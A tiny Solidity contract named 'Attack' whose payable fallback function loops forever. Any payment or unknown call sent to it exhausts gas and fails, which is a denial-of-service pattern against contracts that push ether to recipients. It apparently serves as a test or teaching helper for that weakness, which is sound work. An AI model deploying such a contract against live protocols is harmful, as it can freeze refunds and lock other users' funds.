// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    uint256 counter;

    fallback() external payable {
        while (true) {}
    }
}
